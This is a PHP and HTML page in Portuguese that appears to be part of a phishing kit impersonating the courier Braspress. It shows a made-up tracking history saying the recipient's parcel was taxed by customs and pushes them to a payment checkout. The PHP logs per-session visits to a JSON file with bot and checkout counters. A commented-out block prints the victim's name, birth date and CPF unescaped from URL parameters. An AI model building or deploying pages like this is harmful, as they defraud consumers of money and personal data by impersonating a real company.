<?php
$visitantes_data = "../dados/visitantes.json";
function contar_rastreios($visitantes_data) {
    $ip = $_SERVER["REMOTE_ADDR"];
    $error = ""; // Variável para armazenar mensagens de erro para depuração
    
    // Tenta ler o conteúdo do arquivo JSON
    if (file_exists($visitantes_data)) {
        $conteudo = @file_get_contents($visitantes_data);
        if ($conteudo === false) {
            $error .= "Erro ao ler o arquivo JSON. ";
        }
        $dados = json_decode($conteudo, true);
        if ($dados === null) {
            $error .= "Erro ao decodificar o JSON. ";
        }
    } else {
        $error .= "Arquivo JSON não encontrado. ";
        $dados = null;
    }
    
    // Inicializa o arquivo JSON se não existir ou estiver corrompido
    if ($dados === null) {
        $dados = [
            "visitantes" => 0,
            "bots" => 0,
            "rastreios_count" => 0,
            "rastreios" => [],
            "checkout" => []
        ];
    }
    
    // Garante que a chave "rastreios_count" existe no array
    if (!isset($dados["rastreios_count"])) {
        $dados["rastreios_count"] = 0;
    }
    
    // Verifica se a sessão está ativa e se o usuário já foi contado para rastreios
    if (!isset($_SESSION["registrou_rastreio"])) {
        $dados["rastreios_count"] += 1;
        $_SESSION["registrou_rastreio"] = true;
    } else {
        $error .= "Rastreio já registrado nesta sessão. ";
    }
    
    // Tenta salvar os dados atualizados no arquivo JSON
    $result = @file_put_contents($visitantes_data, json_encode($dados, JSON_PRETTY_PRINT));
    if ($result === false) {
        $error .= "Erro ao salvar o arquivo JSON. Verifique as permissões de escrita. ";
    }

    // echo "Debug: " . $error;
    
    return $dados["rastreios_count"];
}

// Inicia a sessão se ainda não estiver ativa
if (session_status() === PHP_SESSION_NONE) {
    session_start();
}

$totalDeRastreios = contar_rastreios($visitantes_data);

?>

<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" type="text/css" href="../includes/fonte.css">
    <link rel="stylesheet" href="https://use.hugeicons.com/font/icons.css" />
    <script src="https://cdn.jsdelivr.net/npm/@tailwindcss/browser@4"></script>
    <title>Braspress Transportes Urgentes</title>
</head>
<body class="bg-gray-100">
    <header class="bg-sky-800 p-2 flex justify-between items-center">
        <div class="">
            <img src="../assets/imagens/logo.png" alt="Logotipo da Braspress" class="h-15">
        </div>
        <div class="flex m-2">
            <img class="h-5 m-1" src="../assets/icones/menu.svg" alt="Menu">
            <img class="h-5 m-1" src="../assets/icones/usuario.png" alt="Usuário">
        </div>
    </header>

    <div class="p-8">
        <div class="bg-red-100 rounded-lg p-2 mb-4" role="alert">
            <h1 class="text-sm font-semibold mb-1 text-center text-red-700 flex items-center justify-center"><i class="hgi hgi-stroke hgi-alert-circle m-1"></i> SUA ENCOMENDA FOI TRIBUTADA!</h1>
        </div>
        <!--
        <div class="mb-1">
            <p class="text-sm"><i class="hgi hgi-stroke hgi-user-check-01 text-sky-600"></i> <b>Nome:</b> <?php echo $nome = $_GET['nome']; ?></p>
            <p class="text-sm"><i class="hgi hgi-stroke hgi-appointment-01 text-sky-600"></i> <b>Data de Nascimento:</b> <?php echo $nome = $_GET['nascimento']; ?></p>
            <p class="text-sm mb-4"><i class="hgi hgi-stroke hgi-passport-valid text-sky-600"></i> <b>CPF/CNPJ:</b> <?php echo $nome = $_GET['cpf']; ?></p>
            
        -->

            <div class="">
                <a href="checkout.php"><button class="w-full text-center bg-green-700 p-3 rounded-md text-white flex items-center justify-center"><i class="hgi hgi-stroke hgi-dollar-02"></i> Realizar Pagamento</button></a>
            </div>
        </div>
    </div>


    <div class="container mx-auto p-8 mb-10 top-10">
        <ol class="relative border-l border-gray-400">
            <li class="mb-10 ml-4">
                <div class="absolute w-3 h-3 bg-gray-200 rounded-full mt-1.5 -left-1.5 border border-white dark:border-gray-900 dark:bg-gray-700"></div>
                <time class="mb-1 text-sm font-normal leading-none text-gray-500 ">07 de Maio de 2025</time>
                <h3 class="text-lg font-semibold text-red-800 ">Encomenda Taxada</h3>
                <p class="text-sm font-normal text-gray-700">sua encomenda foi retida pela alfândega e aguarda o pagamento dos encargos aduaneiros para que o processo de entrega possa ser concluído.</p>
                <div class="flex items-center mt-2">
                    <span class="text-xs font-semibold text-gray-600 mr-2">Status:</span>
                    <span class="inline-flex items-center rounded-full bg-red-100 px-2.5 py-0.5 text-xs font-medium text-red-700">
                    <i class="hgi hgi-stroke hgi-alert-01 m-1"></i> Aguardando Pagamento
                    </span>
                </div>
            </li>
            <li class="mb-10 ml-4">
                <div class="absolute w-3 h-3 bg-gray-200 rounded-full mt-1.5 -left-1.5 border border-white dark:border-gray-900 dark:bg-gray-700"></div>
                <time class="mb-1 text-sm font-normal leading-none text-gray-500 ">05 de Maio de 2025</time>
                <h3 class="text-lg font-semibold text-sky-800 ">Em Transporte</h3>
                <p class="text-sm font-normal text-gray-500 dark:text-gray-400">Seu pedido foi enviado e está a caminho do centro de distribuição.</p>
            </li>
            <li class="mb-10 ml-4">
                <div class="absolute w-3 h-3 bg-gray-200 rounded-full mt-1.5 -left-1.5 border border-white dark:border-gray-900 dark:bg-gray-700"></div>
                <time class="mb-1 text-sm font-normal leading-none text-gray-500 ">05 de Maio de 2025</time>
                <h3 class="text-lg font-semibold text-sky-800 ">Objeto Recebido</h3>
                <p class="text-sm font-normal text-gray-500 dark:text-gray-400">Seu pedido chegou no pais de destino</p>
            </li>
            <li class="mb-10 ml-4">
                <div class="absolute w-3 h-3 bg-gray-200 rounded-full mt-1.5 -left-1.5 border border-white dark:border-gray-900 dark:bg-gray-700"></div>
                <time class="mb-1 text-sm font-normal leading-none text-gray-500 ">10 de Abril de 2025</time>
                <h3 class="text-lg font-semibold text-sky-800 ">Embarque</h3>
                <p class="text-sm font-normal text-gray-500 dark:text-gray-400">Seu pedido está em trânsito para o pais de destino.</p>
            </li>
            <li class="ml-4">
                <div class="absolute w-3 h-3 bg-gray-200 rounded-full mt-1.5 -left-1.5 border border-white dark:border-gray-900 dark:bg-gray-700"></div>
                <time class="mb-1 text-sm font-normal leading-none text-gray-500 ">30 de Março de 2025</time>
                <h3 class="text-lg font-semibold text-sky-800 ">Objeto Postado</h3>
                <p class="text-sm font-normal text-gray-500 dark:text-gray-400">Seu pedido foi postado no pais de origem</p>
            </li>
        </ol>
    </div>

    <footer class="bg-sky-800 p-6 text-center text-white text-left">
        <h1 class="font-bold text-sm mb-1">Acesso Rápido</h1>
        <p class="text-xs mb-1 text-blue-400">Cotacação Online</p>
        <p class="text-xs mb-1 text-blue-400">Pedido de Coleta</p>
        <p class="text-xs mb-1 text-blue-400">Pagamento de fatura</p>
        <p class="text-xs mb-4 text-blue-400">Prazo de entrega</p>

        <h1 class="font-bold text-sm mb-1">Área do Cliente</h1>
        <p class="text-xs mb-1 text-blue-400">Minha Conta</p>
        <p class="text-xs mb-1 text-blue-400">Solicite seu Acesso</p>
        <p class="text-xs mb-4 text-blue-400">Informações Úteisa</p>

        <h1 class="font-bold text-sm mb-1">A Braspress</h1>
        <p class="text-xs mb-1 text-blue-400">Quem Somos</p>
        <p class="text-xs mb-1 text-blue-400">História</p>
        <p class="text-xs mb-1 text-blue-400">Demonstrativos Financeiros</p>
        <p class="text-xs mb-4 text-blue-400">Certificados</p>

        <h1 class="font-bold text-sm mb-1">Diferenciais</h1>
        <p class="text-xs mb-1 text-blue-400">Abrangência nacional</p>
        <p class="text-xs mb-1 text-blue-400">Infraestrutura</p>
        <p class="text-xs mb-1 text-blue-400">Tecnologia</p>
        <p class="text-xs mb-6 text-blue-400">Automação</p>

        <div class="mb-2 flex">
            <img src="../assets/imagens/link.png" alt="Link" class="h-7 m-1">
            <img src="../assets/imagens/youtube.png" alt="Link" class="h-7 m-1">
            <img src="../assets/imagens/facebook.png" alt="Link" class="h-7 m-1">
            <img src="../assets/imagens/instagram.png" alt="Link" class="h-7 m-1">
        </div>

        <hr class="border-t border-sky-700 mb-4">
        
        <div class="flex flex-col items-center mb-4">
        <img src="../assets/imagens/logo.png" alt="Logo da Braspress" class="h-12 mb-2">
        <p class="text-center text-xs font-lght">© 2025 Braspress - Direitos reservados.</p>
        </div>

    </footer>

    <script src="js/modal.js"></script>

    
</body>
</html>